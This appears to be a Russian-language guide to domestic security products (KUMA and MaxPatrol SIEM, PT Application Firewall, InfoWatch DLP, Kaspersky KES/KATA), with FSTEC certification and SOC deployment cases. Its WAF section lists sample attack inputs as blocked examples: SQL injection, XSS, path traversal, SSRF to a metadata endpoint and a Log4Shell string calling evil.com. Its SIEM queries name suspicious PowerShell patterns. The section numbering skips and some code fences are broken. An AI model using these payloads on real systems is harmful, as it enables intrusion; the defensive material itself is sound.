## 1. KUMA — Kaspersky Unified Monitoring and Analysis

### Что это
KUMA — SIEM-система от «Лаборатории Касперского». Собирает, нормализует и коррелирует события безопасности из различных источников. Сертифицирована ФСТЭК.

### Архитектура

```
┌─────────────┐  ┌─────────────┐  ┌─────────────┐
│  Источники  │  │  Источники  │  │  Источники  │
│  (Windows,  │  │  (Linux,    │  │  (Сеть: FW, │
│   AD, Sysmon│  │   auditd)   │  │   IDS, прокси│
└──────┬──────┘  └──────┬──────┘  └──────┬──────┘
       │                │                │
       ▼                ▼                ▼
┌──────────────────────────────────────────────┐
│            KUMA Collector                     │
│  (сбор, нормализация, фильтрация событий)    │
└──────────────────┬───────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────┐
│            KUMA Correlator                    │
│  (правила корреляции, обнаружение угроз)     │
└──────────────────┬───────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────┐
│            KUMA Storage                       │
│  (ClickHouse — хранение событий)             │
└──────────────────┬───────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────┐
│            KUMA Console                       │
│  (веб-интерфейс, дашборды, расследования)    │
└──────────────────────────────────────────────┘
```

### Ключевые возможности

| Возможность | Описание |
|-------------|----------|
| **Сбор событий** | Syslog, WEC (Windows), SNMP, REST API, файлы, Kafka |
| **Нормализация** | Приведение событий из разных источников к единой схеме |
| **Корреляция** | Правила корреляции (аналог Sigma, но в своём формате) |
| **Active Directory** | Глубокая интеграция с AD: корреляция по пользователям/группам |
| **Threat Intelligence** | Интеграция с Kaspersky Threat Intelligence Portal |
| **SOAR** | Встроенные playbooks для автоматического реагирования |
| **Отчётность** | Готовые отчёты для ФСТЭК, ЦБ, GRC |
| **Хранение** | ClickHouse — быстрый поиск по миллиардам событий |

### Пример правила корреляции (KUMA)

```json
{
  "name": "Brute Force SSH",
  "description": "10+ неудачных SSH-входов за 5 минут с одного IP",
  "type": "aggregation",
  "filter": {
    "and": [
      {"field": "DeviceProduct", "op": "=", "value": "sshd"},
      {"field": "Name", "op": "contains", "value": "Failed password"}
    ]
  },
  "group_by": ["SourceAddress"],
  "threshold": 10,
  "timeframe": "5m",
  "severity": "High",
  "mitre": ["T1110.001"]
}
```

### Интеграция с Kaspersky Security Center

KUMA интегрируется с KSC (Kaspersky Security Center) для:
- Получения событий от Kaspersky Endpoint Security
- Управления политиками защиты
- Корреляции сетевых и хостовых событий
- Автоматического реагирования (изоляция хоста через KES)

### Типовая конфигурация для SOC

```
Минимальная инсталляция KUMA для SOC:

Оборудование:
- KUMA Core: 8 CPU, 32 GB RAM, 500 GB SSD
- KUMA Storage: 8 CPU, 64 GB RAM, 2 TB NVMe (ClickHouse)
- Для 5000 EPS (событий/сек): 1 сервер Core + 1 Storage

Источники (приоритетный порядок подключения):
1. Active Directory (Event Log) — входы, изменения групп, GPO
2. Firewall (iptables, Check Point, UserGate) — сетевой трафик
3. Windows хосты (Sysmon + Security Log) — процессы, файлы, реестр
4. Linux серверы (auditd, syslog) — команды, файлы, сеть
5. Почтовый сервер — входящая/исходящая почта
6. VPN-шлюз — удалённые подключения
7. Прокси-сервер — веб-трафик
8. DNS-сервер — DNS-запросы
9. Антивирус (KES/KSC) — обнаружения, блокировки
10. БД серверы — аудит SQL-запросов
```

## 2. MaxPatrol SIEM (Positive Technologies)

### Что это
MaxPatrol SIEM — SIEM от Positive Technologies, лидер российского рынка. Особенность: asset-centric подход (управление активами) + глубокий анализ уязвимостей (интеграция с MaxPatrol 8/VM).

### Архитектура

```
┌──────────────────────────────────────────┐
│              MP SIEM Core                │
│  (сбор, нормализация, корреляция)        │
├──────────────────────────────────────────┤
│              MP Knowledge Base           │
│  (экспертиза PT: правила, IoC, пакеты)  │
├──────────────────────────────────────────┤
│              PT Platform                 │
│  (единая платформа: SIEM + VM + NAD)    │
└──────────────────────────────────────────┘

Источники → Агенты/Syslog → MP SIEM Core → Корреляция → Инциденты
                                                          ↓
                                                     MP Console
                                                   (расследование)
```

### Ключевые возможности

| Возможность | Описание |
|-------------|----------|
| **Asset Management** | Автоматическое обнаружение и инвентаризация активов |
| **Правила детекции** | Экспертные пакеты от PT Expert Security Center (PT ESC) |
| **Корреляция** | Цепочки атак: связывание разрозненных событий в инцидент |
| **Табличные списки** | Динамические списки для контекстного обогащения |
| **PDQL** | Язык запросов для поиска событий (аналог SPL в Splunk) |
| **Интеграция** | MaxPatrol VM (уязвимости), PT NAD (сетевой трафик), PT Sandbox |
| **Экосистема PT** | Единая платформа с PT NAD, PT Sandbox, PT Application Firewall |

### PDQL — язык запросов MaxPatrol SIEM

```
# Найти все неудачные входы за последний час
select * from events
where event.type = "authentication" and event.status = "failure"
and time > now() - 1h
order by time desc

# Поиск подозрительных PowerShell-команд
select src.host, event.description, event.time
from events
where event.category = "process_start"
and lower(object.process.cmdline) matches "*encodedcommand*"
   or lower(object.process.cmdline) matches "*downloadstring*"

# Агрегация: топ-10 источников неудачных входов
select src.ip, count(*) as attempts
from events
where event.type = "authentication" and event.status = "failure"
group by src.ip
order by attempts desc
limit 10
```

### Пример правила корреляции (MaxPatrol SIEM)

```
rule "Lateral_Movement_PsExec" {
    metadata {
        description = "Обнаружение PsExec: подключение к ADMIN$ + создание сервиса"
        severity = "high"
        mitre_attack = "T1021.002, T1569.002"
    }

    events {
        $share_access = find event where
            event.type = "share_access" and
            object.name matches "*ADMIN$*"

        $service_create = find event where
            event.type = "service_install" and
            time between ($share_access.time, $share_access.time + 5m) and
            src.host = $share_access.src.host
    }

    condition {
        $share_access and $service_create
    }

    actions {
        create_incident(
            name = "Lateral Movement через PsExec",
            assignee = "soc_l2",
            priority = "high"
        )
    }
}
```

### Типовая конфигурация

```
MaxPatrol SIEM — рекомендуемое оборудование:

Малый SOC (до 3000 EPS):
- MP SIEM Core: 16 CPU, 64 GB RAM, 1 TB SSD
- MP SIEM Storage: 16 CPU, 64 GB RAM, 4 TB HDD/SSD

Средний SOC (3000-10000 EPS):
- MP SIEM Core: 32 CPU, 128 GB RAM, 2 TB SSD
- MP SIEM Storage кластер: 3× (16 CPU, 64 GB RAM, 4 TB)

Большой SOC (>10000 EPS):
- Кластерная конфигурация, проектируется индивидуально
```

## 3. PT Application Firewall

### Что это
WAF (Web Application Firewall) от Positive Technologies. Защищает веб-приложения от атак: SQL injection, XSS, CSRF, XXE, и т.д. Сертифицирован ФСТЭК.

### Возможности

| Функция | Описание |
|---------|----------|
| **Защита от OWASP Top 10** | SQL injection, XSS, CSRF, XXE, SSRF, path traversal |
| **Виртуальный патчинг** | Защита от эксплуатации уязвимостей до установки патча |
| **Machine Learning** | Профилирование нормального поведения приложения |
| **API Security** | Защита REST/SOAP/GraphQL API |
| **Bot Protection** | Обнаружение и блокировка ботов |
| **Интеграция** | С MaxPatrol SIEM, PT Sandbox, PT NAD |

### Типовые правила защиты

```
Что блокирует PT AF:

1. SQL Injection:
   GET /search?q=1' OR '1'='1 → BLOCK
   POST /login с ' UNION SELECT... → BLOCK

2. XSS:
   GET /page?name=<script>alert(1)</script> → BLOCK
   POST /comment с <img onerror=...> → BLOCK

3. Path Traversal:
   GET /download?file=../../../../etc/passwd → BLOCK

4. SSRF:
   POST /fetch?url=http://169.254.169.254/metadata → BLOCK

5. Remote Code Execution:
   POST с ${jndi:ldap://evil.com/a} (Log4Shell) → BLOCK

6. Credential Stuffing:
   50+ POST /login с разными парами за минуту → RATE LIMIT + BLOCK
```

### Конфигурация для типового веб-приложения

```
Режимы работы PT AF:
1. Мониторинг (detect only) — логирует, не блокирует
2. Блокировка (prevent) — блокирует атаки
3. Обучение (learning) — строит профиль нормального трафика

Рекомендуемый порядок развёртывания:
1. Установить в режиме "мониторинг" на 1-2 недели
2. Проанализировать ложные срабатывания
3. Добавить исключения для легитимных запросов
4. Переключить в режим "блокировка"
5. Мониторить и тюнить правила
```

## 4. InfoWatch DLP

### Что это
InfoWatch Traffic Monitor — DLP-система (Data Loss Prevention) для предотвращения утечек конфиденциальной информации. Лидер DLP-рынка в РФ.

### Каналы контроля

| Канал | Что контролирует |
|-------|-----------------|
| **Email** | Исходящие письма (SMTP, Exchange, Gmail) |
| **Web** | Загрузка на облачные хранилища, веб-почту, соцсети |
| **USB** | Копирование на съёмные носители |
| **Печать** | Отправка на принтер |
| **Мессенджеры** | Telegram, Teams, Slack (десктопные версии) |
| **Clipboard** | Буфер обмена |
| **Файловые шары** | Копирование на сетевые ресурсы |
| **Скриншоты** | Снимки экрана |

### Типовые политики DLP

```
Политика 1: Защита персональных данных (152-ФЗ)
- Обнаружение: паспортные данные, СНИЛС, ИНН в документах
- Каналы: email, web, USB, печать
- Действие: блокировать + уведомить ИБ-отдел

Политика 2: Защита коммерческой тайны
- Обнаружение: документы с грифом "КТ", финансовые отчёты
- Каналы: все
- Действие: блокировать + инцидент в SIEM

Политика 3: Обнаружение инсайдера
- Обнаружение: массовое копирование файлов (>50 за час)
- Каналы: USB, файловые шары, облака
- Действие: алерт + снимок экрана + запись действий

Политика 4: Защита исходного кода
- Обнаружение: файлы .py, .java, .go, .c, .h, конфигурации
- Каналы: email, web, USB, мессенджеры
- Действие: блокировать + алерт

Политика 5: Антифрод (для банков)
- Обнаружение: номера карт (PAN), CVV, данные счетов
- Каналы: все
- Действие: блокировать + инцидент FinCERT
```

### Интеграция с SIEM

```
InfoWatch → SIEM интеграция:

Событие DLP                    → Формат CEF/Syslog → SIEM
────────────────────────────────────────────────────────────
Попытка отправки ПДн по email  → severity=High      → Инцидент
Копирование КТ на USB          → severity=Critical   → Инцидент + изоляция
Массовое скачивание файлов     → severity=Medium     → Алерт аналитику
Загрузка на облако             → severity=High       → Инцидент
```

## 5. Kaspersky Endpoint Security / KATA

### KES (Kaspersky Endpoint Security)

Антивирус + EDR для конечных точек. Сертифицирован ФСТЭК.

| Функция | Описание |
|---------|----------|
| Антивирусная защита | Сигнатурный + эвристический + ML |
| EDR | Обнаружение и реагирование на угрозы на хостах |
| Контроль устройств | Блокировка USB, Bluetooth, COM-портов |
| Контроль приложений | Белые/чёрные списки ПО |
| Шифрование | FDE (Full Disk Encryption), FLE (File Level Encryption) |
| Patch Management | Управление обновлениями ПО |
| Интеграция | KUMA (SIEM), KSC (управление), KATA (sandbox) |

### KATA (Kaspersky Anti Targeted Attack)

Платформа для обнаружения APT-атак (Advanced Persistent Threats):

```
KATA — как работает:

1. Сбор трафика (Sensor)
   - Копия сетевого трафика (SPAN/TAP)
   - Email-трафик (SMTP)
   - Веб-трафик (HTTP/HTTPS)
   ↓
2. Анализ
   - Статический анализ файлов (антивирус, YARA)
   - Динамический анализ (sandbox)
   - Анализ сетевых аномалий (IDS, ML)
   - Корреляция с Kaspersky Threat Intelligence
   ↓
3. Обнаружение
   - APT-атаки и целевые угрозы
   - Zero-day exploit'ы (sandbox)
   - C2-коммуникации (IDS + ML)
   ↓
4. Реагирование
   - Алерт в консоль KATA
   - Интеграция с KUMA (SIEM)
   - Автоматическая изоляция через KES (EDR)
```

<a id="сертификация"></a>
## 8. Сертификация ФСТЭК/ФСБ

### Зачем нужна сертификация

| Ситуация | Нужна сертификация? |
|----------|-------------------|
| ГИС (государственная ИС) | **Да** (ФСТЭК) |
| Значимый объект КИИ | **Да** (ФСТЭК) |
| ИСПДн (ПДн, УЗ-1/УЗ-2) | **Да** (ФСТЭК) |
| ИСПДн (УЗ-3/УЗ-4) | Рекомендуется |
| Коммерческая ИС без ПДн | Не обязательно |
| Гостайна / СКЗИ | **Да** (ФСБ) |

### Типы сертификатов

| Сертификат | Регулятор | Что проверяет |
|-----------|-----------|---------------|
| Сертификат ФСТЭК | ФСТЭК России | Отсутствие НДВ (недекларированных возможностей), соответствие ТУ |
| Сертификат ФСБ | ФСБ России | Криптографические алгоритмы, защита гостайны |
| Сертификат соответствия ЦБ | Банк России | ГОСТ Р 57580 |

### Уровни доверия (ФСТЭК)

С 2020 года ФСТЭК ввёл **уровни доверия** вместо классов НДВ:

| Уровень | Для чего применяется |
|---------|---------------------|
| **1 (высший)** | Гостайна, СВ «совершенно секретно» |
| **2** | Гостайна, СВ «секретно» |
| **3** | ГИС класса К1, КИИ категории 1 |
| **4** | ГИС К2, КИИ кат. 2, ИСПДн УЗ-1 |
| **5** | ГИС К3, КИИ кат. 3, ИСПДн УЗ-2 |
| **6** | Остальные |

https://reestr.fstec.ru/

Проверить:
□ Сертификат действующий (не просрочен)
□ Версия ПО соответствует сертификату
□ Класс/уровень доверия подходит для вашей ИС

```

### Кейс 1: Развёртывание SOC на отечественном стеке

```
Сценарий: компания-субъект КИИ (энергетика), 2000 хостов

Архитектура SOC:

EDR:      Kaspersky Endpoint Security + KSC
DLP:      InfoWatch Traffic Monitor
WAF:      PT Application Firewall
Scanner:  MaxPatrol VM
Firewall: UserGate (периметр) + Continent (VPN)
SOAR:     R-Vision (автоматизация IR)
ОС:       Astra Linux (серверы) + Windows (рабочие станции)

Интеграция:
- PT NAD → MaxPatrol SIEM (сетевые события)
- KES → KUMA (хостовые события)
- KUMA → MaxPatrol SIEM (корреляция)
- InfoWatch → MaxPatrol SIEM (DLP-инциденты)

### Кейс 2: Импортозамещение Splunk → MaxPatrol SIEM

```
План миграции:

Этап 1 (2 недели): Аудит текущей конфигурации Splunk
- Список источников данных
- Каталог корреляционных правил (SPL → PDQL)
- Список дашбордов и отчётов
- Объём данных (EPS, хранилище)

Этап 2 (4 недели): Параллельная работа
- Развернуть MaxPatrol SIEM
- Подключить ТЕ ЖЕ источники
- Перенести правила корреляции
- Настроить дашборды

Этап 3 (2 недели): Тестирование
- Сравнить обнаружения: Splunk vs MaxPatrol
- Проверить все алерты на ложные срабатывания
- Нагрузочное тестирование

Этап 4 (1 неделя): Переключение
- Перенаправить алерты на MaxPatrol SIEM
- Отключить Splunk (оставить read-only на время)
- Обучить аналитиков PDQL
```

### Кейс 3: Настройка мониторинга для 152-ФЗ

```
Задача: мониторить доступ к ПДн для соответствия 152-ФЗ

Источники:
- БД с ПДн (PostgreSQL audit log, MS SQL Audit)
- 1С (логи доступа к БД)
- Файловые серверы с ПДн (auditd / Windows Security)
- Почтовый сервер (логи отправки)

Правила в SIEM:
1. Массовое чтение из таблиц с ПДн (>1000 записей за запрос)
2. Экспорт данных из БД (COPY, SELECT INTO, mysqldump)
3. Доступ к файлам с ПДн от нетипичного пользователя
4. Отправка вложений >10 МБ (возможна утечка)
5. Доступ в нерабочее время
6. Доступ с нового IP/устройства

DLP-политики (InfoWatch):
1. Обнаружение ПДн в исходящих email (regex: паспорт, СНИЛС)
2. Блокировка загрузки файлов с ПДн на внешние ресурсы
3. Контроль USB при наличии ПДн

Отчёты (для проверки РКН):
1. Кто обращался к ПДн за период
2. Журнал инцидентов с ПДн
3. Статистика обращений субъектов ПДн
```
